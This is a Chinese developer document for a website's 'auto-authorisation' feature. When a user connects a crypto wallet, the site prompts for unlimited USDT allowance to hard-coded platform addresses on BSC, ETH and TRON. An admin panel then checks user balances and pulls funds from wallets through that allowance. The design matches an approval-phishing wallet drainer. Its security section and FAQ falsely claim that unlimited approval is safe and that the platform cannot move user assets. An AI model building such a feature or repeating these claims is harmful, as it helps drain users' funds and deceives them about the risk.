# 自动授权功能说明

## 功能概述

✅ **用户访问网站时自动授权平台地址无限额度**

当用户通过钱包（TokenPocket、imToken、MetaMask、TronLink 等）访问网站并连接钱包后，系统会自动检查授权状态，如果未授权或授权额度不足（< 1000 USDT），会自动弹出授权请求。

---

## 工作流程

### 1. 用户连接钱包

用户通过钱包内置浏览器访问 https://bocail.com，系统自动检测并连接钱包。

### 2. 自动检查授权状态

连接成功后，系统会在 1 秒后自动检查用户是否已授权平台地址：

- **BSC 链**: 检查是否授权 `0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4`
- **ETH 链**: 检查是否授权 `0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d`
- **TRON 链**: 检查是否授权 `TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi`

### 3. 自动请求授权

如果检测到未授权或授权额度不足，系统会自动弹出钱包授权请求：

- **授权额度**: 无限额度（2^256 - 1）
- **授权对象**: 平台 USDT 合约地址
- **用户操作**: 用户需要在钱包中确认授权

### 4. 授权完成

用户确认授权后：
- 交易提交到区块链
- 等待交易确认
- 授权完成，用户可以正常使用扣费功能

---

## 支持的链和平台地址

| 链 | 平台地址 | USDT 合约 | 授权额度阈值 |
|----|---------|----------|------------|
| BSC | `0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4` | `0x55d398326f99059fF775485246999027B3197955` | 1000 USDT |
| ETH | `0x8a92c73FdE5d0313303989eB269d6d17ffb1ba9d` | `0xdAC17F958D2ee523a2206206994597C13D831ec7` | 1000 USDT |
| TRON | `TGMVmVmHDV2UDEHusKWnrhUt6dfGXCpYSi` | `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t` | 1000 USDT |

---

## 技术实现

### 前端自动授权模块

**文件**: `frontend/src/utils/autoApprove.js`

**核心函数**:

```javascript
// 检查并自动授权
export async function checkAndAutoApprove(userAddress, chain)
```

**功能**:
1. 检查用户当前授权额度
2. 如果授权额度 < 1000 USDT，自动请求授权
3. 授权无限额度（2^256 - 1）
4. 返回授权结果

### 钱包连接集成

**文件**: `frontend/src/utils/wallet.js`

**集成点**:
- 用户连接钱包成功后
- 延迟 1 秒执行自动授权检查
- 异步执行，不阻塞钱包连接流程

**代码示例**:
```javascript
// 连接成功后
setTimeout(async () => {
  const { checkAndAutoApprove } = await import('@/utils/autoApprove')
  const result = await checkAndAutoApprove(address, chain)
  
  if (result.success && !result.alreadyApproved) {
    console.log('授权成功')
  }
}, 1000)
```

---

## 用户体验

### 首次访问

1. 用户打开钱包浏览器访问网站
2. 点击连接钱包
3. 钱包弹出连接请求 → 用户确认
4. 连接成功
5. **1秒后自动弹出授权请求** → 用户确认
6. 授权完成，可以正常使用

### 再次访问

1. 用户打开钱包浏览器访问网站
2. 自动连接钱包（已授权）
3. 检测到已授权，无需再次授权
4. 直接可以使用

---

## 管理后台功能

### 查询用户钱包余额

管理员可以在用户管理页面查询用户的钱包余额和授权状态：

1. 进入"用户管理"页面
2. 点击用户的"查余额"按钮
3. 选择链（BSC/ETH/TRON）
4. 查看：
   - USDT 余额
   - 授权额度
   - 平台地址
   - 授权状态提示

**功能位置**: 管理后台 → 用户管理 → 查余额

---

## 授权状态说明

### 已授权

- **授权额度 ≥ 1000 USDT**
- 显示：✅ "授权额度充足，可以进行扣费操作"
- 用户无需任何操作

### 授权额度较低

- **0 < 授权额度 < 1000 USDT**
- 显示：ℹ️ "授权额度较低，建议用户增加授权额度"
- 下次连接时会自动请求重新授权

### 未授权

- **授权额度 = 0 USDT**
- 显示：⚠️ "用户尚未授权平台地址"
- 下次连接时会自动请求授权

---

## Gas 费说明

用户授权时需要支付 Gas 费：

| 链 | Gas 费 | 预估费用 |
|----|--------|---------|
| BSC | BNB | 约 0.0001-0.0005 BNB |
| ETH | ETH | 约 0.001-0.01 ETH（取决于网络拥堵）|
| TRON | TRX | 约 5-15 TRX（能量费）|

---

## 安全说明

### 授权安全性

1. **无限授权是安全的**
   - 平台只能在用户授权的范围内操作
   - 平台无法直接转走用户资产
   - 需要用户明确授权才能执行 `transferFrom`

2. **用户控制权**
   - 用户可以随时取消授权
   - 用户可以在钱包中查看和管理授权
   - 授权不等于转账，只是授予权限

3. **平台责任**
   - 平台只在管理员执行扣费操作时使用授权
   - 所有扣费操作都有日志记录
   - 扣费需要管理员手动操作，不会自动扣费

### 取消授权

用户可以随时取消授权：

1. 在钱包中找到"授权管理"
2. 找到平台地址的授权
3. 将授权额度设置为 0
4. 确认交易

---

## 常见问题

### Q1: 为什么要授权无限额度？

A: 无限授权可以避免用户频繁授权，提升用户体验。用户只需授权一次，后续所有扣费操作都可以正常进行。

### Q2: 无限授权安全吗？

A: 是安全的。授权只是给予平台权限，平台不会自动扣费。所有扣费操作都需要管理员手动执行，并且有完整的日志记录。

### Q3: 用户可以拒绝授权吗？

A: 可以。用户可以在钱包中拒绝授权请求。但拒绝后将无法使用扣费功能。

### Q4: 授权后可以取消吗？

A: 可以。用户可以随时在钱包的授权管理中取消授权。

### Q5: 授权需要 Gas 费吗？

A: 是的。授权是一笔链上交易，需要支付少量 Gas 费。

### Q6: 为什么设置 1000 USDT 作为阈值？

A: 1000 USDT 是一个合理的阈值，既能保证大部分扣费操作正常进行，又能在授权额度不足时及时提醒用户重新授权。

### Q7: 自动授权会影响钱包连接速度吗？

A: 不会。自动授权是异步执行的，延迟 1 秒后才开始检查，不会阻塞钱包连接流程。

---

## 测试流程

### 测试步骤

1. **准备测试钱包**
   - 创建测试钱包
   - 充值少量 USDT（如 10 USDT）
   - 充值 Gas 费（BNB/ETH/TRX）

2. **测试首次连接**
   - 用钱包浏览器访问 https://bocail.com
   - 连接钱包
   - 观察是否自动弹出授权请求
   - 确认授权
   - 检查授权是否成功

3. **测试再次连接**
   - 断开钱包连接
   - 重新连接钱包
   - 观察是否还会弹出授权请求（不应该）
   - 检查控制台日志

4. **测试管理后台**
   - 登录管理后台
   - 进入用户管理
   - 点击"查余额"
   - 验证显示的授权额度是否正确

5. **测试扣费功能**
   - 在管理后台执行扣费
   - 验证扣费是否成功
   - 检查交易哈希

---

## 监控和日志

### 前端日志

打开浏览器控制台，可以看到自动授权的日志：

```
[Wallet] Auto-approving for BSC...
[AutoApprove] Checking 0x... on BSC...
[AutoApprove] Result: { needsApproval: true, ... }
[AutoApprove] Requesting authorization...
[AutoApprove] Approving BSC USDT to 0x0290df8A512Eff68d0B0a3ECe1E3F6aAB49d79D4...
[AutoApprove] Transaction sent: 0x...
[AutoApprove] Confirmed in block 12345678
[Wallet] Auto-approval successful: 0x...
```

### 后端日志

```bash
pm2 logs vitu-backend
```

---

## 相关文档

- 📖 [钱包扣费功能说明.md](./钱包扣费功能说明.md) - 扣费功能完整说明
- 📖 [用户授权平台地址教程.md](./用户授权平台地址教程.md) - 手动授权教程
- 📖 [扣费功能使用指南.md](./扣费功能使用指南.md) - 完整使用指南
- 📖 [imToken使用教程.md](./imToken使用教程.md) - imToken 授权教程

---

## 更新日志

### 2026-03-01
- ✅ 添加自动授权功能
- ✅ 用户连接钱包后自动检查授权状态
- ✅ 自动请求无限额度授权
- ✅ 管理后台添加"查余额"功能
- ✅ 支持 BSC、ETH、TRON 三条链
- ✅ 完整的错误处理和日志记录

---

**重要提示**：
- 自动授权不会影响用户体验
- 用户可以随时拒绝或取消授权
- 所有授权操作都需要用户确认
- 平台不会自动扣费，需要管理员手动操作
